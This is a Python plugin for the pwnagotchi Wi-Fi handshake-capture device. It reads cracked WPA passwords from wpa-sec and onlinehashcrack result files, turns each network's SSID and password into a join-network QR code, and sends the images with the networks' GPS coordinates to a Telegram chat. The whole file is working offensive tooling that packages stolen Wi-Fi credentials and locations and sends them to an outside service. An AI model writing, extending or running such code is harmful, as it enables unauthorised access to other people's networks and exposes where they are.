from pwnagotchi import config
from PIL import Image
import pwnagotchi, logging, qrcode, json, html, csv, os, io, glob, telegram, time
import pwnagotchi.plugins as plugins

class qt(plugins.Plugin):
    __author__ = 'NeonLightning'
    __version__ = '0.1.3'
    __license__ = 'GPL3'
    __description__ = 'takes cracked hashes, makes qr codes, and will send that, the login info and the location if possible to your telegram.'
        
    def on_loaded(self):
        logging.info("[qt] loaded")
        if not os.path.exists('/home/pi/qrcodes/'):
            os.makedirs('/home/pi/qrcodes/')
        self.qrcode_dir = '/home/pi/qrcodes/'
        
        self.bot_token = config['main']['plugins']['qt']['bot_token']
        self.chat_id = config['main']['plugins']['qt']['chat_id']

        self.bot = telegram.Bot(token=self.bot_token)

        self.last_files = set()

        self.all_bssid=[]
        
        self._update_all()
        self.send_qr_codes()

        
    def on_unloaded(self):
        logging.info("[qt] done")
        return
        
    def _update_all(self):
        all_passwd=[]
        all_ssid=[]

        wpa_sec_filepath = '/root/handshakes/wpa-sec.cracked.potfile'
        f = open(wpa_sec_filepath, 'r+', encoding='utf-8')
        try:
            for line_f in f:
                pwd_f = line_f.split(':')
                all_passwd.append(str(pwd_f[-1].rstrip('\n')))
                self.all_bssid.append(str(pwd_f[0]))
                all_ssid.append(str(pwd_f[-2]))
        except:
            logging.error('[qt] encountered a problem in wpa-sec.cracked.potfile')
        f.close()

        onlinehashcrack_filepath = '/root/handshakes/onlinehashcrack.cracked'
        h = open(onlinehashcrack_filepath, 'r+', encoding='utf-8')
        try:
            for line_h in csv.DictReader(h):
                pwd_h = str(line_h['password'])
                bssid_h = str(line_h['BSSID'])
                ssid_h = str(line_h['ESSID'])
                if pwd_h and bssid_h and ssid_h:
                    all_passwd.append(pwd_h)
                    self.all_bssid.append(bssid_h)
                    all_ssid.append(ssid_h)
        except:
            logging.error('[qt] encountered a problem in onlinehashcrack.cracked')
        h.close()
                    
        for bssid, ssid, password in zip(self.all_bssid, all_ssid, all_passwd):
            if not os.path.exists('/home/pi/qrcodes/'):
                os.makedirs('/home/pi/qrcodes/')
                self.qrcode_dir = '/home/pi/qrcodes/'

            png_filepath = os.path.join("/home/pi/qrcodes/", f"{ssid}-{password}-{bssid.lower().replace(':', '')}.png")

            if os.path.exists(png_filepath):
                continue

            qr_data = f"WIFI:T:WPA;S:{html.escape(ssid)};P:{html.escape(password)};;"

            qr_code = qrcode.QRCode(
                version=None,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            qr_code.add_data(qr_data)
            qr_code.make(fit=True)

            try:
                img = qr_code.make_image(fill_color="yellow", back_color="black")
                img.save(png_filepath)
                logging.info(f"[qt] QR code generated and saved for {ssid}-{password}-{bssid.lower().replace(':', '')}")
            except Exception as e:
                logging.error(f"[qt] something went wrong generating QR code for {ssid}-{password}-{bssid.lower().replace(':', '')}: {e}")

    def on_internet_available(self, agent):
        pass
        
    def send_qr_codes(self):
        dir_path = "/home/pi/qrcodes"
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)

        sent_files = set()

        qrlist_path = "/home/pi/.qrlist"
        if not os.path.exists(qrlist_path):
            open(qrlist_path, 'a+').close()

        with open(qrlist_path, 'r+') as f:
            content = f.read()
            if content:
                sent_files = set(content.split('\n'))

        while True:
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
                
            current_files = set(f for f in os.listdir('/home/pi/qrcodes') if f.endswith('.png'))
            new_files = current_files - sent_files
            deleted_files = sent_files - current_files

            if new_files or deleted_files:
                self._update_all()

            for filename in new_files:
                if filename in sent_files:
                    continue
                bssid = filename.rsplit('-', 1)[-1].rsplit('.', 1)[0].lower().replace(':', '')
                ssid_n_pass = filename.rsplit('-', 1)[-2]
                geojson_files = glob.glob(f"/root/handshakes/*_{bssid}.geo.json")
                if geojson_files:
                    with open(f"/home/pi/qrcodes/{filename}", 'rb') as f_png, open(geojson_files[0], 'r') as f_geojson:
                        data = json.load(f_geojson)
                        lat = data['location']['lat']
                        lng = data['location']['lng']
                        self.bot.send_message(self.chat_id, f"VVV  {ssid_n_pass} Lat: {lat}, Lng: {lng}")
                        self.bot.send_photo(self.chat_id, f_png)
                        self.bot.send_message(self.chat_id, f"^^^")
                        time.sleep(1)
                else:
                    with open(f"/home/pi/qrcodes/{filename}", 'rb') as f:
                        self.bot.send_message(self.chat_id, f"VVV  Sending file {ssid_n_pass}, Unknown Location")
                        self.bot.send_photo(self.chat_id, f)
                        self.bot.send_message(self.chat_id, f"^^^")
                        time.sleep(1)
                sent_files.add(filename)

            if deleted_files:
                for filename in deleted_files:
                    if filename in sent_files:
                        sent_files.remove(filename)
                    logging.info(f"[qt] file {filename} deleted")

            with open(qrlist_path, 'w') as f:
                f.write('\n'.join(sent_files))
